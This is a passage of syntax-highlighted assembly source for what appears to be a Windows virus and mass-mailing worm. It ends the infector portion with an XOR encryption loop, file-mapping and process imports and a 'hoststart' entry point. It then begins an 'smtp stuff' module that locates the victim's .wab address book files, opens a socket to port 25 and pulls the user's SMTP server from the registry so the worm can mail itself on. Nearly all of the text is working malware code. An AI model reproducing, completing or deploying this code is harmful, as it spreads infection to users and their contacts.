</span><span class="sc5">cryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cryptor</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">importedapis</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">k32i</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;kernel32 imports</span><span class="sc0">

        </span><span class="sc5">iLoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGetProcAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iCreateSemaphoreA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iReleaseSemaphore</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iCreateThread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iCloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGetTickCount</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGetModuleHandleA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc5">iSetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iCreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iCreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iMapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iUnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iSetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iGetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iSetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iCopyFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iMoveFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc5">iCreateProcessA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc5">iBeep</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc5">NOFK32</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">k32i</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">endofidata</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;end of initialized data..</span><span class="sc0">

</span><span class="sc5">ws32i</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;wsock32 imports</span><span class="sc0">
        </span><span class="sc5">WSAStartup</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">inet_addr</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">gethostbyaddr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">htons</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">socket</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">connect</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">send</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">recv</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">closesocket</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">WSACleanup</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc5">NOFWS32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ws32i</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">filemaph</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fileh</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oldattr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ThreadHandle1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ThreadHandle2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SemaphoreHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NOF</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">pushtable</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">endofuidata</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">fill</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">hoststart</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc1">; the smtp stuff</span><span class="sc0">




</span><span class="sc1">;                                -0SD0RPP0SSE-</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;            </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;                 </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;                </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;               </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">inet_addr</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;             </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCreateKeyA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">tasm</span><span class="sc0">\</span><span class="sc5">bin</span><span class="sc0">\</span><span class="sc5">win32api.inc</span><span class="sc0">


</span><span class="sc5">WSADESCRIPTION_LEN</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">256d</span><span class="sc0">
</span><span class="sc5">WSASYS_STATUS_LEN</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">128d</span><span class="sc0">
</span><span class="sc5">AF_INET</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2d</span><span class="sc0">

</span><span class="sc5">filehandles</span><span class="sc0">     </span><span class="sc9">struct</span><span class="sc0">
  </span><span class="sc5">file</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">filemap</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">viewmap</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filehandles</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
  </span><span class="sc5">wVersion</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">wHighVersion</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">szDescription</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">WSADESCRIPTION_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">szSystemStatus</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">WSASYS_STATUS_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">iMaxSockets</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">iMaxUdpDg</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">lpVendorInfo</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
  </span><span class="sc5">sin_family</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc5">sin_port</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">sin_addr</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">sin_zero</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">


        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smtpbuffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;save edi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wabfilemask</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wabfilemasksize</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;edi = smtpbuffer fullpath</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtpfindstructure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">doei</span><span class="sc0">                            </span><span class="sc1">;(</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smtpfindstructure.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                           </span><span class="sc1">;edi = '\*.wab',0h</span><span class="sc0">

</span><span class="sc5">copyfoundfiletopath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">copyfoundfiletopath</span><span class="sc0">

        


</span><span class="sc5">kapnou</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">     </span><span class="sc1">;close findhandle (already on stack)</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">WSAData</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSAStartup</span><span class="sc0">                      </span><span class="sc1">;startup WinSock services</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                               
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">socket</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save socket nr</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">htons</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in.sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in.sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;       Get the user's SMTP server from the registery</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nametoopen</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">                               </span><span class="sc1">;current user</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegCreateKeyA</span><span class="sc0">                           </span><span class="sc1">;open main key</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">doei</span><span class="sc0">

</span><span class="sc5">more_data</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maxvaluesize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smtpbuffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">leeg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">valuename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">more_data</span><span class="sc0">       </span><span class="sc1">;?</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">doei</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smtpbuffer</span><span class="sc0">              </span><span class="sc1">;convert hostname to IP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gethostbyname</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">foutdusdis</span><span class="sc0">

